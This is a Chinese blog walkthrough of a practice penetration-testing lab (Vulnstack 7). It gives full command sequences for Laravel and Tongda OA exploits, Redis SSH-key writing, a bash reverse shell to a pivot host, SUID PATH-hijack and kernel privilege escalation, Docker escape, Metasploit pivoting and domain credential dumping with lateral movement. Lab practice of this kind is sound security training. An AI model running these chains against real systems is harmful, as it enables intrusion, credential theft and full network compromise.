内网靶场7
2021-08-06 14:27:03

今天我们来测测红日第七个靶场，直接开干。

下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/9/

下载完后里面会有一个环境搭建的教程，按上面的教程搭建就行了。这里就不作多的赘述了，在这里提醒几点就行了，Ubuntu启动环境是要切换到root，上面写的是OA系统在pc2上面，但是我在ps2上面没有找到文件，文件在pc1上面。

先扫DMZ端口，开放了22，80，81，6379。其中80和81都是web，访问80没什么收获，81用的是Laravel框架，右下角有他的版本号，网上查询这个版本号有漏洞CVE-2021-3129。运用一键shell工具直接上传shell连接。下载地址：https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP

查看当前用户名比较像docker环境，使用cat /proc/1/cgroup命令发现确实是docker环境。

尝试多次反弹命令都失败，回到刚刚还扫到了22，6379，使用redis-cli-h 192.168.1.9可直接未授权访问，

而且目标还开放了22ssh，直接使用redis写入ssh密钥登录。

在攻击机上执行：

ssh-keygen -t rsa #生成公钥

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt #将公钥导入foo.txt文件

cat foo.txt | redis-cli -h 192.168.1.9 -p 6379 -x set hello #把foo.txt文件内容写入目标主机的redis缓冲中

在redis上执行：

config set dir /root/.ssh # 设置redis的备份路径为/root/.ssh/

config set dbfilename authorized_keys # 设置保存文件名为authorized_keys

save # 将数据保存在目标服务器硬盘上

在攻击机上执行：

ssh 192.168.1.9 # 连接成功

进行信息收集，发现ip段52，发现81端口设置了另一台52段主机做代理，怪不得反弹不了，记住这个ip，这是那台有docker主机的IP。

我们攻击机的IP段为1，但是这台ssh登入主机却和docker在一个网段，我们可以使用52.10的当作跳板机，把docker那台反弹回来。在蚁剑执行bash -c 'exec bash -i &>/dev/tcp/192.168.1.9/2333 <&1'，然后在刚刚的ssh机上用nc监听，命令nc -lvnp 2333。最后成功反弹，然后先提升权限，再进行docker逃逸。

下面使用环境变量来提权，执行find / -user root -perm -4000 -print 2>/dev/null，下面有名字shell文件，执行的是ps命令，且权限很高，我们可以把ps设置为变量从而提高权限执行任意命令。执行：

cd /tmp

echo "/bin/bash" > ps

chmod 777 ps

echo $PATH

export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序

cd /home/jobs

./shell

成功获得一个交互命令窗口，权限为root，再创建一个ssh连接，把监听到的root权限的shell弹到ssh里面，和上面一样。此时我们权限是root，但还是在docker里面，我们下面进行docker逃逸。

尝试设置计划任务反弹shell无果，然后使用ssh进行docker逃逸。通过把我们以获取ssh权限的机器的ssh公钥写入有docker机器的文件里，就能实现ssh免密登录。

首先在已获得权限的ssh里面执行：

ssh-keygen -f hello

chmod 600 hello #赋予权限

cat hello.pub

复制文件内容

在docker那台执行：

cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys #-avx是将权限也一起复制

echo > /hello/home/ubuntu/.ssh/authorized_keys #清空authorized_keys文件

echo '复制的.pub文件的内容' > /hello/home/ubuntu/.ssh/authorized_keys #将ssh秘钥写入authorized_keys文件

cat /hello/home/ubuntu/.ssh/authorized_keys #查看是否写入成功

再进入开始的ssh那台使用ubuntu登录

ssh -i hello ubuntu@192.168.52.20

因为使用的ubuntu用户登录，所以权限还不够，还需要使用CVE-2021-3493提权。

https://github.com/briskets/CVE-2021-3493

vim exploit.c

把下载的代码复制进去

gcc exploit.c -o exploit #编译

chmod +x exploit #加权限

./exploit

成功提升至root权限

至此已经获得两台主机的web权限。下面开始把shell反弹到msf：

use exploit/multi/script/web_delivery

set lhost 192.168.1.9

set LpORT 4445

run

先把生成的python代码放到web1里面执行，meterpreter。因为有多层网络，所以必须把52段加入路由：

route add 192.168.52.0 255.255.255.0 1 #route add ip 掩码 session

在重复上面操作把web2也反弹回来。再把93段的路由也加上好了，现在就有两个session了。

然后进入内网探测存活主机和开放端口，先建立一个socks代理，让我们的工具可以直接扫内网。

在msf执行：

use auxiliary/server/socks_proxy

set srvhost 127.0.0.1

set srvport 11111

run

在kali主机执行：

vi /etc/proxychains.conf

把socks5 127.0.0.1 11111复制到最后一行

使用方法是在执行的命令前面加proxychains

然后使用nmap发现52段还存在一台主机为192.168.52.30，扫描其开放的端口，和具体信息。

发现8888端口(默认配的是8080，我自己改的8888)为HTTP，在浏览器中设置socks5代理并访问。

是一个OA管理系统，

收集信息，知道其为通达OA11.3版本，可直接上传任意文件。

exp地址：https://github.com/admintony/TongdaRCE

把里面的pyload改为蚁剑的pyload，直接上传成功，连接蚁剑成功。

在蚁剑上面运行cs pyload 成功反弹shell到cs上面，进行域信息收集，使用mkz直接抓取到了域控的明文密码。

用msf扫下93段的主机

use auxiliary/scanner/netbios/nbname

set rhosts 192.168.93.1-100

run

可以看到除了刚刚cs上线的还有两台主机，93.30和93.40，93.30那台是域管。

这两台主机都有永恒之蓝漏洞，但是却弹不回来session，应该是防火墙的原因。

因为我们已经抓取到了域管的明文密码，可以直接在cs里面进行横向渗透。

在cs上根据收集到的信息创建目标

视图-》目标-》add

使用刚刚抓取到的域管密码登录，成功反弹shell。（如果不懂看我上篇文章）

至此所有主机全被我们拿下。
